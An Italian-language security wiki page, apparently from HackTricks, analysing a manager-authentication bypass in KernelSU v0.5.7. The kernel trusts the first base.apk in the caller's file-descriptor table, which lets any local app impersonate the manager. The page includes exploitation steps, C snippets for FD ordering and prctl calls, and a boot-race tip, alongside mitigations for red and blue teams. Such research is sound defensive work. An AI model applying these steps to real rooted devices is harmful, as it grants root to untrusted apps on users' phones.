# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

I framework di rooting come KernelSU, APatch, SKRoot e Magisk patchano frequentemente il kernel Linux/Android ed espongono funzionalità privilegiate a un'app "manager" in userspace non privilegiata tramite una syscall hookata. Se il passaggio di autenticazione del manager è difettoso, qualsiasi app locale può accedere a questo canale e aumentare i privilegi su dispositivi già rootati.

Questa pagina astratta le tecniche e le insidie scoperte nella ricerca pubblica (in particolare l'analisi di Zimperium su KernelSU v0.5.7) per aiutare sia i team rossi che blu a comprendere le superfici di attacco, le primitive di sfruttamento e le mitigazioni robuste.

---
## Pattern architetturale: canale manager hookato da syscall

- Il modulo/patch del kernel hooka una syscall (comunemente prctl) per ricevere "comandi" da userspace.
- Il protocollo tipicamente è: magic_value, command_id, arg_ptr/len ...
- Un'app manager in userspace si autentica prima (ad es., CMD_BECOME_MANAGER). Una volta che il kernel contrassegna il chiamante come un manager fidato, i comandi privilegiati vengono accettati:
- Concedi root al chiamante (ad es., CMD_GRANT_ROOT)
- Gestisci le liste di autorizzazione/negazione per su
- Regola la politica SELinux (ad es., CMD_SET_SEPOLICY)
- Interroga versione/configurazione
- Poiché qualsiasi app può invocare syscall, la correttezza dell'autenticazione del manager è critica.

Esempio (design di KernelSU):
- Syscall hookata: prctl
- Valore magico per deviare al gestore di KernelSU: 0xDEADBEEF
- I comandi includono: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, ecc.

---
## Flusso di autenticazione di KernelSU v0.5.7 (come implementato)

Quando userspace chiama prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU verifica:

1) Controllo del prefisso del percorso
- Il percorso fornito deve iniziare con un prefisso atteso per l'UID del chiamante, ad es. /data/data/<pkg> o /data/user/<id>/<pkg>.
- Riferimento: core_hook.c (v0.5.7) logica del prefisso del percorso.

2) Controllo della proprietà
- Il percorso deve essere di proprietà dell'UID del chiamante.
- Riferimento: core_hook.c (v0.5.7) logica della proprietà.

3) Controllo della firma APK tramite scansione della tabella FD
- Itera i descrittori di file (FD) aperti dal processo chiamante.
- Scegli il primo file il cui percorso corrisponde a /data/app/*/base.apk.
- Analizza la firma APK v2 e verifica contro il certificato ufficiale del manager.
- Riferimenti: manager.c (iterando FDs), apk_sign.c (verifica APK v2).

Se tutti i controlli passano, il kernel memorizza temporaneamente l'UID del manager e accetta comandi privilegiati da quell'UID fino al reset.

---
## Classe di vulnerabilità: fidarsi "del primo APK corrispondente" dall'iterazione FD

Se il controllo della firma si lega a "il primo /data/app/*/base.apk corrispondente" trovato nella tabella FD del processo, in realtà non sta verificando il pacchetto del chiamante. Un attaccante può pre-posizionare un APK firmato legittimamente (quello del vero manager) in modo che appaia prima nella lista FD rispetto al proprio base.apk.

Questa fiducia per indiretto consente a un'app non privilegiata di impersonare il manager senza possedere la chiave di firma del manager.

Proprietà chiave sfruttate:
- La scansione FD non si lega all'identità del pacchetto del chiamante; si limita a fare un pattern-match delle stringhe di percorso.
- open() restituisce il FD disponibile più basso. Chiudendo prima i FD numerati inferiormente, un attaccante può controllare l'ordinamento.
- Il filtro controlla solo che il percorso corrisponda a /data/app/*/base.apk – non che corrisponda al pacchetto installato del chiamante.

---
## Precondizioni di attacco

- Il dispositivo è già rootato con un framework di rooting vulnerabile (ad es., KernelSU v0.5.7).
- L'attaccante può eseguire codice arbitrario non privilegiato localmente (processo dell'app Android).
- Il vero manager non si è ancora autenticato (ad es., subito dopo un riavvio). Alcuni framework memorizzano l'UID del manager dopo il successo; devi vincere la corsa.

---
## Schema di sfruttamento (KernelSU v0.5.7)

Passaggi ad alto livello:
1) Costruisci un percorso valido per la directory dei dati della tua app per soddisfare i controlli di prefisso e proprietà.
2) Assicurati che un base.apk genuino di KernelSU Manager sia aperto su un FD numerato inferiore rispetto al tuo base.apk.
3) Invoca prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) per superare i controlli.
4) Emissione di comandi privilegiati come CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY per mantenere l'elevazione.

Note pratiche sul passaggio 2 (ordinamento FD):
- Identifica il tuo FD di processo per il tuo /data/app/*/base.apk camminando nei symlink di /proc/self/fd.
- Chiudi un FD basso (ad es., stdin, fd 0) e apri prima l'APK legittimo del manager in modo che occupi fd 0 (o qualsiasi indice inferiore al tuo fd base.apk).
- Raggruppa l'APK legittimo del manager con la tua app in modo che il suo percorso soddisfi il filtro ingenuo del kernel. Ad esempio, posizionalo sotto un sottopercorso che corrisponde a /data/app/*/base.apk.

Esempi di frammenti di codice (Android/Linux, solo illustrativi):

Enumerare i FD aperti per localizzare le voci base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Forza un FD con numero inferiore a puntare all'APK del manager legittimo:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Autenticazione del manager tramite hook prctl:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Dopo il successo, comandi privilegiati (esempi):
- CMD_GRANT_ROOT: promuovere il processo corrente a root
- CMD_ALLOW_SU: aggiungere il tuo pacchetto/UID all'elenco di autorizzazione per su persistente
- CMD_SET_SEPOLICY: regolare la politica SELinux come supportato dal framework

Suggerimento su race/persistenza:
- Registrare un ricevitore BOOT_COMPLETED in AndroidManifest (RECEIVE_BOOT_COMPLETED) per avviarsi presto dopo il riavvio e tentare l'autenticazione prima del vero manager.

---
## Indicazioni per rilevamento e mitigazione

Per gli sviluppatori di framework:
- Legare l'autenticazione al pacchetto/UID del chiamante, non a FDs arbitrari:
- Risolvere il pacchetto del chiamante dal suo UID e verificare contro la firma del pacchetto installato (tramite PackageManager) piuttosto che scansionare FDs.
- Se solo kernel, utilizzare un'identità del chiamante stabile (credenziali del task) e convalidare su una fonte di verità stabile gestita da init/userspace helper, non FDs di processo.
- Evitare controlli di prefisso del percorso come identità; sono facilmente soddisfacibili dal chiamante.
- Utilizzare una sfida-risposta basata su nonce attraverso il canale e cancellare qualsiasi identità del manager memorizzata nella cache all'avvio o in eventi chiave.
- Considerare IPC autenticato basato su binder invece di sovraccaricare syscalls generici quando possibile.

Per difensori/team blu:
- Rilevare la presenza di framework di rooting e processi manager; monitorare le chiamate prctl con costanti magiche sospette (ad es., 0xDEADBEEF) se hai telemetria del kernel.
- Su flotte gestite, bloccare o allertare sui ricevitori di avvio da pacchetti non affidabili che tentano rapidamente comandi manager privilegiati dopo l'avvio.
- Assicurarsi che i dispositivi siano aggiornati a versioni del framework patchate; invalidare gli ID del manager memorizzati nella cache all'aggiornamento.

Limitazioni dell'attacco:
- Colpisce solo i dispositivi già rootati con un framework vulnerabile.
- Tipicamente richiede una finestra di riavvio/race prima che il manager legittimo si autentichi (alcuni framework memorizzano nella cache l'UID del manager fino al reset).

---
## Note correlate tra i framework

- L'autenticazione basata su password (ad es., build storiche di APatch/SKRoot) può essere debole se le password sono indovinabili/bruteforceabili o se le convalide sono difettose.
- L'autenticazione basata su pacchetto/firma (ad es., KernelSU) è più forte in linea di principio ma deve legarsi al chiamante effettivo, non a artefatti indiretti come le scansioni di FD.
- Magisk: CVE-2024-48336 (MagiskEoP) ha dimostrato che anche ecosistemi maturi possono essere suscettibili a spoofing dell'identità che porta all'esecuzione di codice con root all'interno del contesto del manager.

---
## Riferimenti

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
